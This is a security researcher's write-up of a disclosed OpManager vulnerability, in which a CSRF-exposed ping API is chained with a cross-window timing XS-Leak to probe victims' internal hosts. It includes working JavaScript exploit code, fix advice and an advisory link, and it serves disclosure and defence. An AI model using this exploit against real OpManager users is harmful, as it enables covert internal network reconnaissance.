---
title: "OpManager: CSRF & XS-Leak Chained for Information Disclosure"
author: "Jayateertha Guruprasad"
date: 2024-04-18T12:41:00.067Z
lastmod: 2024-08-31T13:12:51+05:30

description: ""

subtitle: ""

image: "/post/img/2024-04-18_opmanager-csrf-xsleak-chained-for-information-disclosure_0.png" 
images:
 - "/post/img/2024-04-18_opmanager-csrf-xsleak-chained-for-information-disclosure_0.png"


aliases:
- "/opmanager-csrf-xs-leak-chained-for-information-disclosure"

---

[**ManageEngine OpManager**](https://www.manageengine.com/network-monitoring/) is a powerful network monitoring software that provides deep visibility into the performance of your routers, switches, firewalls, load balancers, wireless LAN controllers, servers, VMs, printers, and storage devices.

OpManager has tools like ping, traceroute etc which authenticated users can access via Web UI.

Let’s take our attacker scenario using the ping tool provided in the Web UI of OpManager.

The API request used for ping tool is — `https://OpManager:8061/client/api/json/tools/getPing?actionFrom=scanButton&doAction=Ping&enhancedPingValue=true&ipOrHost=$ {host}&selectedTab=DIAGNOSTIC_TOOLS&selectedToolID=PING&_=${timestamp}`

**The above API request is sent as GET request without any CSRF checks, Hence attacker could craft a website which when opened by a authenticated OpManager victim would make a ping request to any internal device/host in the network of victim.**

Okay, for now we are able to make a internal ping request due to no CSRF checks, but How does attacker know if the IP exist or not through CSRF vulnerability ?

> **Due to browser protection like SOP & proper CORS configurations, attacker can only make request from victim’s session due to lack of CSRF verification, but cannot read the response of API request.**

**Here comes XS-Leak to our rescue.**
We will be using a variation of [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks) to exploit this scenario & know if a internal IP exist in the victim’s network or not remotely.

By Using [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks), An attacker can measure the network timing of a page by opening a new window with `window.open` and waiting for the `window` to start loading. During the time window has not fully loaded, **win.origin** object will be accessible by the parent window which opened it. But when window is fully loaded origin of the window will be changed, Hence when parent window tries to access **win.origin** object due to Browser’s SOP protection exception will be thrown.

**Attack Scenario —**

1. Attacker crafts a website which when visited by victim, **opens new window**(assume name of window as child) to **https://OpManager:8061/client/api/json/tools/getPing?actionFrom=scanButton&doAction=Ping&enhancedPingValue=true&ipOrHost=${host}&selectedTab=DIAGNOSTIC_TOOLS&selectedToolID=PING&_=${timestamp}** & **starts a timer**.
2. Until the child window is fully loaded, when the attacker tries to access child Windows Origin object from attacker website, origin will be accessible & will be either the attacker website or about://blank depending on the browser used.
3. When the child window is fully loaded, when attacker’s website tries to access child window’s origin, origin will be changed to OpManager, Hence accessing Child window origin will throw a exception in the attacker’s website.
4. When exception is received, **timer is stopped & response time is calculated**.
5. If response time is less than say 7 sec, it means host is accessible, If response time is longer than 7 sec it means host in inaccessible as ping is taking lot of time.

**Exploit Code —**

{{< highlight javascript >}}
function measureHostExistence(host) {
    var uri = `https://OpManager:8061/client/api/json/tools/getPing?actionFrom=scanButton&doAction=Ping&enhancedPingValue=true&ipOrHost=${host}&selectedTab=DIAGNOSTIC_TOOLS&selectedToolID=PING&_=${Date.now()}`;
    var win = window.open(uri);
    var start = performance.now();

    function measure() {
        try {
            win.origin;
            setTimeout(measure, 0);
        } catch (e) {
            var time = performance.now() - start;
            if (time > 7000) {
                console.log("Host: " + host + " " + "does not exist");
            } else {
                console.log("Host: " + host + " " + "exists");
            }
        }
    }
    measure();
}
var inexistent_host = "192.168.1.254";
measureHostExistence(inexistent_host);
var existent_host = "127.0.0.1";
measureHostExistence(existent_host);
var existent_host = "192.168.208.32";
measureHostExistence(existent_host);
{{< /highlight >}}

![](/post/img/2024-04-18_opmanager-csrf-xsleak-chained-for-information-disclosure_0.png#layoutTextWidth)


> **Impact — Attacker can determine if a host/device with particular IP exists in the internal network of OpManager, This will work even in DMZ assuming only OpManager server is accessible to attacker or exposed through internet.**

**Fix Suggested —**

1. Change the method to POST for urls doing sensitive actions & implement proper CSRF protection
2. Use samesite=strict for authentication cookies

As this was low severity vulnerability with negligible impact there was no bounty paid by Zoho in this case.

**Advisory**:[**https://www.manageengine.com/itom/advisory/zve-2024-1132.html**](https://www.manageengine.com/itom/advisory/zve-2024-1132.html)

**References:**

1. [https://infosecwriteups.com/xs-leak-deanonymize-microsoft-skype-users-by-any-3rd-party-website-69849e4501a8](https://infosecwriteups.com/xs-leak-deanonymize-microsoft-skype-users-by-any-3rd-party-website-69849e4501a8)
2. [XS-Leaks.dev](https://xsleaks.dev/docs/attacks/error-events/)
3. [Multiple XS-Leak in Google found by Tezranq](https://portswigger.net/daily-swig/new-xs-leak-techniques-reveal-fresh-ways-to-expose-user-information)

#### **Liked my article ? Follow me on** [**LinkedIn**](https://www.linkedin.com/in/jayateerthag/)**, Twitter (**[**@jayateerthaG**](https://twitter.com/jayateerthag)**), and **[**Medium**](https://jayateerthag.medium.com/)** for more content about bugbounty, Infosec, cybersecurity and hacking.**

* * *
Written on April 18, 2024 by Jayateertha Guruprasad.

Originally published on [Medium](https://medium.com/@jayateerthag/opmanager-csrf-xs-leak-chained-for-information-disclosure-382c6ee518ca)
